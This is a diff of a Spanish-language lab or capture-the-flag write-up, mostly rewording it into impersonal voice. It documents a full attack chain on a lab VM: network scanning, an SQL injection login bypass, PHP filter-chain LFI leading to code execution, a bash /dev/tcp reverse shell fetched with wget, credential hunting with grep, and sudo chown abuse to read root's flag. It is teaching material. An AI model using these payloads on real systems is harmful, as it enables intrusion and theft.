@@ -35,7 +35,7 @@
 
 ## 1. Reconocimiento de red
 
-Comencé comprobando la configuración de red de Kali y la ruta hacia la red del laboratorio:
+Se comienza comprobando la configuración de red de Kali y la ruta hacia la red del laboratorio:
 
 ```bash
 ip -br addr
@@ -54,13 +54,13 @@ La interfaz `eth0` tenía asignada la dirección `192.168.0.13/24`, con ruta a l
 *Tabla de rutas y puerta de enlace*
 
 
-Para descubrir los equipos activos realicé un barrido ARP con Nmap:
+Para descubrir los equipos activos realiza un barrido ARP con Nmap:
 
 ```bash
 sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
 ```
 
-Posteriormente extraje las direcciones identificadas del archivo `.gnmap`:
+Posteriormente se extrajeron las direcciones identificadas del archivo `.gnmap`:
 
 ```bash
 awk '/Status: Up/ {print $2}' host-discovery-inicial.gnmap
@@ -81,7 +81,7 @@ Entre los hosts activos apareció `192.168.0.14`, identificado por Nmap con una 
 
 ### 2.1 Escaneo completo de puertos TCP
 
-Realicé un escaneo de los 65.535 puertos TCP:
+Se realizó un escaneo de los 65.535 puertos TCP:
 
 ```bash
 sudo nmap -sS -p- 192.168.0.14 -oA port-scanning-full-tcp-192.168.0.14
@@ -115,13 +115,13 @@ sudo nmap -sV -p 22,80 192.168.0.14 -oA service-detection-inicial-192.168.0.14
 *Identificación de servicios y versiones*
 
 
-También realicé detección de sistema operativo:
+También se ejeecutó la detección de sistema operativo:
 
 ```bash
 sudo nmap -O 192.168.0.14 -oA os-fingerprint-192.168.0.14
 ```
 
-Nmap estimó un sistema Linux con kernel de la familia 4.x–5.x. Esta identificación es aproximada y no debe interpretarse como una versión exacta.
+Nmap estimó un sistema Linux con kernel de la familia 4.x–5.x. Esta identificación es aproximada no una versión exacta.
 
 <img width="530" height="292" alt="07-sistema-operativo" src="https://github.com/user-attachments/assets/519588df-b67c-4e8e-a3dc-4103030ece7f" />
 
@@ -130,7 +130,7 @@ Nmap estimó un sistema Linux con kernel de la familia 4.x–5.x. Esta identific
 
 ### 2.3 Enumeración de SSH
 
-Inspeccioné los algoritmos criptográficos anunciados por el servicio:
+Se inspeccionaron los algoritmos criptográficos anunciados por el servicio:
 
 ```bash
 nmap -p 22 --script ssh2-enum-algos 192.168.0.14
@@ -141,7 +141,7 @@ nmap -p 22 --script ssh2-enum-algos 192.168.0.14
 *Enumeración de algoritmos SSH*
 
 
-También comprobé los métodos de autenticación anunciados para `root`:
+También se comprobaron los métodos de autenticación anunciados para `root`:
 
 ```bash
 nmap -p 22 \
@@ -150,7 +150,7 @@ nmap -p 22 \
   192.168.0.14
 ```
 
-El servidor anunciaba autenticación por clave pública y contraseña. No obtuve acceso por SSH en esta etapa, por lo que continué con el servicio HTTP.
+El servidor anunciaba autenticación por clave pública y contraseña. No se obtuvo acceso por SSH en esta etapa, por lo que se continuó con el servicio HTTP.
 
 <img width="487" height="262" alt="09-autenticacion-ssh" src="https://github.com/user-attachments/assets/acc18db0-9ef9-4da7-83b0-f3ec39e36b09" />
 
@@ -161,7 +161,7 @@ El servidor anunciaba autenticación por clave pública y contraseña. No obtuve
 
 ### 3.1 Respuesta HTTP inicial
 
-Consulté las cabeceras del servidor:
+Se consultaron las cabeceras del servidor:
 
 ```bash
 curl -I http://192.168.0.14 | tee http-headers-inicial-192.168.0.14.txt
@@ -174,14 +174,14 @@ La respuesta fue `HTTP/1.1 200 OK`, con Apache 2.4.62 sobre Debian.
 *Cabeceras HTTP del servidor*
 
 
-Al abrir `http://192.168.0.14/` encontré la página predeterminada de Apache2 Debian, que no revelaba directamente la aplicación objetivo.
+Al abrir `http://192.168.0.14/` se encontró la página predeterminada de Apache2 Debian, que no revelaba directamente la aplicación objetivo.
 
 <img width="951" height="723" alt="11-apache-default" src="https://github.com/user-attachments/assets/d480c855-4d0d-4da3-9bab-b8822a34934a" />
 
 *Página predeterminada de Apache*
 
 
-También comprobé si existía un archivo `robots.txt`:
+También se comprobó si existía un archivo `robots.txt`:
 
 ```bash
 curl -i http://192.168.0.14/robots.txt | tee http-robots-inicial-192.168.0.14.txt
@@ -196,7 +196,7 @@ El servidor respondió `404 Not Found`; no se obtuvo información adicional por 
 
 ### 3.2 Descubrimiento de directorios
 
-Ejecuté Gobuster contra la raíz web:
+Se ejecutó Gobuster contra la raíz web:
 
 ```bash
 gobuster dir \
@@ -215,7 +215,7 @@ Entre los resultados destacó `/library/`, con redirección `301`. Las entradas 
 
 ### 3.3 Inspección de `/library/`
 
-Consulté su HTML:
+Se consultó su HTML:
 
 ```bash
 curl -i http://192.168.0.14/library/
@@ -232,7 +232,7 @@ La página se titulaba *Steam inspired game card hover effect* y presentaba tarj
 *Vista de la aplicación /library/*
 
 
-Revisé el JavaScript expuesto:
+Se revisó el JavaScript expuesto:
 
 ```bash
 curl -s http://192.168.0.14/library/script.js
@@ -245,7 +245,7 @@ El archivo contenía créditos de imágenes; no surgió de esta revisión una cr
 *Inspección del archivo JavaScript*
 
 
-Amplié la enumeración sobre `/library/`, incorporando extensiones:
+Se amplió la enumeración sobre `/library/`, incorporando extensiones:
 
 ```bash
 gobuster dir \
@@ -272,7 +272,7 @@ Se identificaron, entre otras rutas:
 
 ### 3.4 Identificación del panel de login
 
-Consulté el directorio administrativo:
+Se consultó el directorio administrativo:
 
 ```bash
 curl -iL http://192.168.0.14/library/admin/
@@ -291,20 +291,20 @@ La aplicación respondió inicialmente con una redirección `302` hacia `/librar
 
 ## 4. Bypass de autenticación mediante SQL Injection
 
-En el formulario de login probé una carga de inyección SQL en los campos de autenticación:
+En el formulario de login se probó una carga de inyección SQL en los campos de autenticación:
 
 ```sql
 ' OR 1=1 -- -
 ```
 
-La expresión introduce una condición siempre verdadera (`1=1`) y utiliza el comentario SQL para neutralizar el resto de la consulta cuando el contexto de la aplicación lo permite. En este laboratorio, la prueba permitió superar el formulario sin disponer de credenciales válidas.
+La expresión introduce una condición siempre verdadera (`1=1`) y utiliza el comentario SQL para neutralizar el resto de la consulta cuando el contexto de la aplicación lo permite. La prueba permitió superar el formulario sin ingresar credenciales válidas.
 
 <img width="407" height="238" alt="20-sqli" src="https://github.com/user-attachments/assets/9348dc4d-0a37-4e7f-8985-d2d5eacc39c8" />
 
 *Prueba de SQL Injection en el formulario de login*
 
 
-Tras enviar el formulario, conseguí acceder al panel administrativo de la aplicación.
+Tras enviar el formulario, se consiguió acceder al panel administrativo de la aplicación.
 
 <img width="942" height="878" alt="21-admin" src="https://github.com/user-attachments/assets/d25448a6-2f81-4f17-a812-3d2bd41ec689" />
 
@@ -317,14 +317,14 @@ Tras enviar el formulario, conseguí acceder al panel administrativo de la aplic
 
 ### 5.1 Identificación del parámetro `lang`
 
-Dentro del panel administrativo inspeccioné el código fuente y observé enlaces de selección de idioma:
+Dentro del panel administrativo se inspeccionó el código fuente y se observaron enlaces de selección de idioma:
 
 ```html
 <a href="index.php?lang=es.php">es</a>
 <a href="index.php?lang=en.php">en</a>
 ```
 
-El parámetro `lang` parecía controlar qué archivo PHP se cargaba. Lo investigué como posible punto de inclusión local de archivos (*Local File Inclusion*, LFI).
+El parámetro `lang` parecía controlar qué archivo PHP se cargaba. Se investigó como posible punto de inclusión local de archivos (*Local File Inclusion*, LFI).
 
 <img width="942" height="878" alt="21-admin" src="https://github.com/user-attachments/assets/610a2abd-d0dc-41c1-a7a2-27acf4978c79" />
 
@@ -333,7 +333,7 @@ El parámetro `lang` parecía controlar qué archivo PHP se cargaba. Lo investig
 
 ### 5.2 Lectura de código PHP mediante filtros
 
-Probé el wrapper de PHP `php://filter` para solicitar una representación Base64 de un archivo PHP:
+Se probó el wrapper de PHP `php://filter` para solicitar una representación Base64 de un archivo PHP:
 
 ```text
 index.php?lang=php://filter/convert.base64-encode/resource=index.php
@@ -348,9 +348,9 @@ La respuesta permitió obtener contenido codificado en Base64, lo que evidenció
 
 ### 5.3 De lectura de archivos a ejecución de código
 
-A continuación utilicé el generador `php_filter_chain_generator.py` de Synacktiv para construir cadenas `php://filter` capaces de introducir contenido PHP en el flujo de inclusión.
+A continuación se utilizó el generador `php_filter_chain_generator.py` de Synacktiv para construir cadenas `php://filter` capaces de introducir contenido PHP en el flujo de inclusión.
 
-Primero realicé pruebas sencillas para confirmar ejecución, por ejemplo:
+Primero se realizaron pruebas sencillas para confirmar ejecución, por ejemplo:
 
 ```php
 <?=print(12345);?>
@@ -372,20 +372,20 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ### 5.4 Limitación por longitud de la petición
 
-Al intentar ejecutar cargas más largas, encontré problemas por la longitud de las cadenas generadas. El servidor rechazaba algunas solicitudes extensas, compatibles con el límite de longitud de la línea de petición HTTP de Apache (por ejemplo, errores `414 URI Too Long`).
+Al intentar ejecutar cargas más largas, se encontraron problemas por la longitud de las cadenas generadas. El servidor rechazaba algunas solicitudes extensas, compatibles con el límite de longitud de la línea de petición HTTP de Apache (por ejemplo, errores `414 URI Too Long`).
 
 <img width="227" height="37" alt="24-limite-http" src="https://github.com/user-attachments/assets/8fd0262d-d75a-4b01-85e7-2e2b564661e7" />
 
 *Verificación del límite de longitud de las peticiones*
 
 
-Para evitar ese problema opté por un enfoque en dos etapas: colocar un script corto en el servidor y generar una cadena PHP Filter mínima que únicamente lo ejecutara.
+Para evitar ese problema se optó por un enfoque en dos etapas: colocar un script corto en el servidor y generar una cadena PHP Filter mínima que únicamente lo ejecutara.
 
 ## 6. Obtención de reverse shell
 
 ### 6.1 Preparación del script
 
-En Kali preparé un archivo llamado `r` con el comando de conexión inversa:
+En Kali se preparó un archivo llamado `r` con el comando de conexión inversa:
 
 ```bash
 bash -i >& /dev/tcp/192.168.0.13/443 0>&1
@@ -393,7 +393,7 @@ bash -i >& /dev/tcp/192.168.0.13/443 0>&1
 
 Este comando utiliza una funcionalidad de Bash para conectar la entrada y salida de una shell interactiva con un socket TCP hacia Kali. El destino corresponde exclusivamente a la IP del laboratorio.
 
-Levanté un servidor HTTP para entregar el archivo:
+Se ejecutói un servidor HTTP para entregar el archivo:
 
 ```bash
 python3 -m http.server 8000
@@ -416,7 +416,7 @@ En el objetivo se verificó que `wget` y Bash estaban disponibles, mientras que 
 
 ### 6.2 Generación de la cadena corta
 
-En lugar de insertar la reverse shell completa dentro de la cadena PHP Filter, generé una carga que ejecutaba el archivo ya descargado:
+En lugar de insertar la reverse shell completa dentro de la cadena PHP Filter, se generó una carga que ejecutaba el archivo ya descargado:
 
 ```bash
 python3 php_filter_chain_generator.py \
@@ -424,7 +424,7 @@ python3 php_filter_chain_generator.py \
   | grep '^php://filter/' > ejecutar-r.txt
 ```
 
-Verifiqué el tamaño del archivo:
+Se verificó el tamaño del archivo:
 
 ```bash
 wc -c ejecutar-r.txt
@@ -439,15 +439,15 @@ El resultado registrado fue de **2916 bytes**, suficientemente pequeño para est
 
 ### 6.3 Recepción de la conexión
 
-En Kali inicié un listener:
+En Kali se inició un listener:
 
 ```bash
 nc -lvnp 443
 ```
 
-Envié el contenido de `ejecutar-r.txt` mediante el parámetro `lang` del panel autenticado. El servidor ejecutó `bash r` y estableció la conexión inversa hacia Kali.
+Se envió el contenido de `ejecutar-r.txt` mediante el parámetro `lang` del panel autenticado. El servidor ejecutó `bash r` y estableció la conexión inversa hacia Kali.
 
-Una vez recibida la shell, confirmé el contexto de ejecución:
+Una vez recibida la shell, se confirmó el contexto de ejecución:
 
 ```bash
 whoami
@@ -469,14 +469,11 @@ loweb
 
 *Reverse shell obtenida como www-data*
 
-
-> **Nota de laboratorio:** durante las pruebas se perdió una sesión al interactuar con `su` y algunos procesos/peticiones quedaron sin respuesta. Tras reiniciar la VM se recuperó el acceso al panel y se repitió la explotación. Esta incidencia no constituyó una vulnerabilidad adicional demostrada.
-
 ## 7. Enumeración local y credenciales
 
 ### 7.1 Localización de la flag de usuario
 
-Desde la shell de `www-data` busqué la flag:
+Desde la shell de `www-data` se  buscó la flag:
 
 ```bash
 find / -type f -name 'user.txt' 2>/dev/null
@@ -502,7 +499,7 @@ cat /home/r3dh4ck/user.txt
 
 ### 7.2 Búsqueda de credenciales
 
-Para identificar posibles secretos almacenados en archivos accesibles realicé una búsqueda de la palabra `password`:
+Para identificar posibles secretos almacenados en archivos accesibles se realizó una búsqueda de la palabra `password`:
 
 ```bash
 grep -RinI 'password' / 2>/dev/null
@@ -524,7 +521,7 @@ La captura muestra la contraseña completa; aquí se omite su reproducción para
 
 ### 7.3 Cambio al usuario `r3dh4ck`
 
-Probé la contraseña descubierta para cambiar de usuario:
+Se probó la contraseña descubierta para cambiar de usuario:
 
 ```bash
 su r3dh4ck
@@ -589,7 +586,7 @@ User r3dh4ck may run the following commands on loweb:
 
 ### 8.2 Cambio de propietario y lectura
 
-Aproveché el permiso de ejecutar `chown` como root para asignar la propiedad de la flag al usuario actual:
+Se aprovechó el permiso de ejecutar `chown` como root para asignar la propiedad de la flag al usuario actual:
 
 ```bash
 sudo /usr/bin/chown r3dh4ck /home/r3dh4ck/user.txt
@@ -600,7 +597,7 @@ sudo /usr/bin/chown r3dh4ck /home/r3dh4ck/user.txt
 *Cambio de propietario de user.txt mediante sudo chown*
 
 
-Después comprobé que el archivo podía leerse:
+Después se comprobó que el archivo podía leerse:
 
 ```bash
 cat /home/r3dh4ck/user.txt
@@ -626,7 +623,7 @@ cd /root
 # Permission denied
 ```
 
-Modifiqué el propietario del directorio:
+Se modificó el propietario del directorio:
 
 ```bash
 sudo /usr/bin/chown r3dh4ck /root
@@ -647,7 +644,7 @@ r00t.txt
 
 ### 9.2 Cambio de propietario de la flag
 
-Ejecuté:
+Se ejecutó:
 
 ```bash
 sudo /usr/bin/chown r3dh4ck /root/r00t.txt
@@ -661,7 +658,7 @@ cat /root/r00t.txt
 *Acceso a /root y lectura de r00t.txt mediante abuso de chown*
 
 
-> **Alcance del resultado:** esta secuencia demuestra acceso a una flag protegida mediante cambios de propietario ejecutados con privilegios elevados. No debe confundirse automáticamente con la obtención de una shell interactiva con UID 0. Para completar el objetivo del laboratorio no fue necesario modificar `/etc/passwd`.
+> **Alcance del resultado:** esta secuencia demuestra acceso a una flag protegida mediante cambios de propietario ejecutados con privilegios elevados.
 
 
 ### Cadena de ataque observada
